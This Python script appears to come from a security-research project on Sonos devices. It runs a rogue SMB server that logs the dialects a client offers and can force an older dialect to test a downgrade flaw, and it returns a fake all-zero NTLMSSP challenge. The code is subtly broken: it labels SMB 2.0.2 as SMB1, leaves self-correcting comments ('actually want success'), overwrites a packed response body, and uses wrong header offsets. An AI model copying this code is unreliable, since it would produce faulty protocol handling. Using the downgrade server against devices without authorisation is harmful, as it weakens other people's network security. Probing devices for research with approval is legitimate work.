#!/usr/bin/env python3
"""SMB NEGOTIATE dialect probe — logs exactly what the Sonos SMB client offers
and lets the server answer with a chosen dialect (the CVE-2026-4149 downgrade
shape, SSA-2026-0001).

Runs under the fsonos venv (impacket). Purely a server: no device contact
happens until the coordinator approves a device run; this file is the
static/offline half of frankensonos-s2-cve-2026-4149-downgrade-nc0.

usage: negprobe.py PORT [--dialect 0x0202|0x0210|0x0300|0x0302|0x0311]
  Logs, per connection: remote (ip, port), every SMB_COM_NEGOTIATE /
  SMB2 NEGOTIATE the client sends, the raw dialect byte-string list, the
  negotiated answer, and every follow-up command name.

The dialect list the client offers is the whole downgrade question:
- if it offers SMB1 (0x0202 "SMB 2.0.2") alongside 2.1/3.x, a rogue server can
  pin the oldest;
- if it offers only 3.x with pre-auth integrity (SMB 3.1.1 negotiate
  context), downgrade answering is bounded by what the client verifies.

Leave --dialect off to answer with the client's best dialect (honest server)
and just record the offer.
"""
import socket
import struct
import sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4450
FORCE = None
if '--dialect' in sys.argv:
    FORCE = int(sys.argv[sys.argv.index('--dialect') + 1], 16)


def parse_smb1_negotiate(body):
    """SMB1 NEGOTIATE: u8 wct, u8 bcc, then u8-terminated dialect strings."""
    if len(body) < 2:
        return []
    wct, bcc = body[0], body[1]
    buf = body[2:2 + bcc]
    # Dialects: null-terminated strings, each prefixed by a 0x02 'protocol' byte
    dialects, cur = [], None
    for b in buf:
        if b == 0x02 and cur is None:
            cur = bytearray()
        elif cur is not None and b != 0x00:
            cur.append(b)
        elif cur is not None and b == 0x00:
            dialects.append(bytes(cur).decode(errors='replace'))
            cur = None
    return dialects


def parse_smb2_negotiate(body):
    """SMB2 NEGOTIATE (64-byte header already stripped? no - raw header here).

    body = full SMB2 header (64 B) + negotiate request.
    StructureSize==36; DialectCount u16 at +2 of the fixed part; dialects
    u16 each.
    """
    if len(body) < 64 + 36:
        return None, []
    fixed = body[64:]
    structsize = struct.unpack('<H', fixed[0:2])[0]
    if structsize != 36:
        return structsize, []
    dcount = struct.unpack('<H', fixed[2:4])[0]
    dialects = list(struct.unpack('<%dH' % dcount, fixed[4:4 + 2 * dcount])) if dcount else []
    return structsize, dialects


def dialect_names(ds):
    out = []
    for d in ds:
        if d == 0x0202:
            out.append('2.0.2')
        elif d == 0x0210:
            out.append('2.1')
        elif d == 0x0300:
            out.append('3.0')
        elif d == 0x0302:
            out.append('3.0.2')
        elif d == 0x0311:
            out.append('3.1.1')
        else:
            out.append(hex(d))
    return out


def cmd_name(cmd):
    names = ['NEGOTIATE', 'SESSION_SETUP', 'LOGOFF', 'TREE_CONNECT', 'TREE_DISCONNECT',
             'CREATE', 'CLOSE', 'FLUSH', 'READ', 'WRITE', 'LOCK', 'IOCTL',
             'CANCEL', 'ECHO', 'QUERY_DIRECTORY', 'CHANGE_NOTIFY', 'QUERY_INFO',
             'SET_INFO', 'OPLOCK_BREAK']
    return names[cmd] if cmd < len(names) else str(cmd)


def serve():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', PORT))
    s.listen(4)
    print(f'negprobe listening on :{PORT} force_dialect={hex(FORCE) if FORCE else "best"}', flush=True)
    while True:
        conn, addr = s.accept()
        try:
            handle(conn, addr)
        except Exception as e:
            print(f'[err {addr}] {e!r}', flush=True)
        finally:
            conn.close()


def handle(conn, addr):
    print(f'--- connection from {addr[0]}:{addr[1]}', flush=True)
    buf = b''
    while True:
        chunk = conn.recv(65536)
        if not chunk:
            print('--- closed by client', flush=True)
            return
        buf += chunk
        # NetBIOS session header: 4 bytes (u8 type, 3-byte length)
        while len(buf) >= 4:
            nb_type = buf[0]
            nb_len = int.from_bytes(buf[1:4], 'big')
            if len(buf) < 4 + nb_len:
                break
            pdu = buf[4:4 + nb_len]
            buf = buf[4 + nb_len:]
            reply = react(pdu, addr)
            if reply is not None:
                out = b'\x00' + len(reply).to_bytes(3, 'big') + reply
                conn.sendall(out)


def react(pdu, addr):
    # SMB1 multi-protocol starts with '\xffSMB'; SMB2 with '\xfeSMB'
    if pdu[:4] == b'\xffSMB':
        cmd = pdu[4]
        if cmd == 0x72:  # SMB_COM_NEGOTIATE
            dialects = parse_smb1_negotiate(pdu[36:])
            print(f'[{addr[0]}] SMB1 NEGOTIATE dialects: {dialects}', flush=True)
            # Answer SMB1 negotiate: choose Dialect index 0 and no security blob,
            # which for a 2.x-only client should push it to abandon SMB1 (the
            # downgrade test comes from answering SMB1 affirmatively).
            resp = bytearray(pdu[:36])
            resp[4] = 0x72
            resp[5] = 0  # no error... actually want success: status 0
            struct.pack_into('<I', resp, 9, 0)  # status = 0
            struct.pack_into('<H', resp, 32, 7)  # wct = 7
            body = struct.pack('<HBBHIHH', 7, 0, 0, 0, 0, 0, 0)  # dialect idx 0, secmode 0
            body += struct.pack('<H', 0) + b''  # bcc 0
            out = bytes(resp[:36]) + body
            print(f'[{addr[0]}] -> SMB1 negotiate answer (dialect index 0)', flush=True)
            return out
        print(f'[{addr[0]}] SMB1 cmd {hex(cmd)} len {len(pdu)}', flush=True)
        return None
    if pdu[:4] == b'\xfeSMB':
        cmd = pdu[12]
        creditr, creditc, flags, nextcmd, mid, pid, sid, tid = struct.unpack('<HHIIIHHH', pdu[4:32])
        print(f'[{addr[0]}] SMB2 cmd {cmd_name(cmd)} mid={hex(mid)} next={hex(nextcmd)} sid={hex(sid)} tid={hex(tid)}', flush=True)
        if cmd == 0:
            ssize, dialects = parse_smb2_negotiate(pdu)
            names = dialect_names(dialects)
            print(f'[{addr[0]}] SMB2 NEGOTIATE structsize={ssize} dialects={names}', flush=True)
            # Build an honest SMB2 NEGOTIATE reply for the chosen dialect
            chosen = FORCE if FORCE else (max(dialects) if dialects else 0x0210)
            if chosen not in dialects:
                chosen = max(dialects) if dialects else 0x0210
            print(f'[{addr[0]}] -> answering dialect {dialect_names([chosen])[0]}', flush=True)
            # SMB2 header response
            hdr = bytearray(64)
            hdr[0:4] = b'\xfeSMB'
            hdr[4:6] = struct.pack('<H', 64)  # structure size
            hdr[6:8] = struct.pack('<H', 1)   # credit response
            hdr[8:12] = struct.pack('<I', 0)  # status 0
            hdr[12] = 0  # command negotiate
            hdr[14:16] = struct.pack('<H', 1)  # credits granted
            hdr[16:20] = struct.pack('<I', 0x1)  # flags: server-to-redirector? keep 0
            hdr[20:24] = struct.pack('<I', 0)  # next command
            hdr[24:32] = pdu[24:32]  # message id
            hdr[32:36] = pdu[32:36]  # process id/reserved
            hdr[36:44] = pdu[36:44]  # session id
            # Negotiate response: StructureSize 65, selected dialect...
            body = struct.pack('<HHIH', 65, chosen, 0, 65535)  # structsize, dialect, security mode? actually:
            # (StructureSize u16, Dialect u16, SecurityMode u16, MxTrans u32, Caps u32, GUID16, Start16, ...)
            body = struct.pack('<HHHII', 65, chosen, 1, 65536, 0) + bytes(16) + struct.pack('<QI', 0, 0)
            return bytes(hdr) + body
        # generic positive reply for session setup etc: keep minimal, client will retry/cleanly fail
        hdr = bytearray(64)
        hdr[0:4] = b'\xfeSMB'
        hdr[4:6] = struct.pack('<H', 64)
        hdr[6:8] = struct.pack('<H', 1)
        hdr[8:12] = struct.pack('<I', 0)
        hdr[12] = cmd
        hdr[14:16] = struct.pack('<H', 1)
        hdr[16:20] = struct.pack('<I', 0)
        hdr[20:24] = struct.pack('<I', 0)
        hdr[24:32] = pdu[24:32]
        hdr[32:36] = pdu[32:36]
        hdr[36:44] = pdu[36:44]
        body = b'\x00' * 8
        if cmd == 1:  # session setup: give a fake NTLMSSP challenge of zeros to see what it does
            body = struct.pack('<HH', 9, 0) + bytes(16)
        return bytes(hdr) + body
    # NetBIOS keepalive (type 0x81/0x85 etc.)
    print(f'[{addr[0]}] non-SMB pdu type {hex(pdu[0]) if pdu else "?"} len {len(pdu)}', flush=True)
    return None


if __name__ == '__main__':
    serve()
